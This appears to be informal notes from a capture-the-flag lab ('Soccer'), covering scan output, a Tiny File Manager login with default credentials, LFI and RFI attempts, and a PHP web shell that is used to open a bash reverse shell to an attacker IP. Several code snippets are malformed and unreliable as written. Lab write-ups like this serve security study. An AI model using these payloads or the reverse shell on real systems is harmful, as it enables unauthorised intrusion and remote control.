###
Soccer
###
1-Enummeration:
    └─$ nmap -sV -sC -Pn 10.129.133.2 -v
        PORT     STATE SERVICE         VERSION
        22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
        |   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
        |_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
        80/tcp   open  http            nginx 1.18.0 (Ubuntu)
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_http-title: Did not follow redirect to http://soccer.htb/
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        9091/tcp open  xmltec-xmlmail?
        | fingerprint-strings: 
        |   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
        |     HTTP/1.1 400 Bad Request
        |     Connection: close
        |   GetRequest: 
        |     HTTP/1.1 404 Not Found


    nikto -h http://soccer.htb/
         /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

    
    $ gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
        /tiny

    Port 80:
        nginx/1.18.0 (Ubuntu)

        http://soccer.htb/tiny/
            Login Page


        Via BurpSuite we can see that we can amnipulate variable in url:
            GET /tiny/tinyfilemanager.php?img=


            GET /tiny/tinyfilemanager.php?img=<echo "Hello, " . $_GET['name'];` HTTP/1.1
                Response 200: IHDR

            RFI: <include($_GET['file'] . ".php");` 
            LFI: file=../../etc/passwd` 
            
            CMD: <?php
                 system($_REQUEST['cmd']);
                 ?>

            Session Hijcaking: <include($_GET['file'] . ".php");`
    
    tinyfilemanager is configured with the default credentials:
        admin - admiin@123


    Get a remote shell:
        on Burp Repeater we try to execute remote cmds via cmd2.php that contains <?php system($_REQUEST['cmd']); ?>:
            POST /tiny/uploads/cmd2.php HTTP/1.1

            cmd=whoami


        Repeater remote shell:
            POST /tiny/uploads/cmd2.php HTTP/1.1

            cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.69/9001 0>&1'

            Encode URL Format:
                cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.69/9001+0>%261'
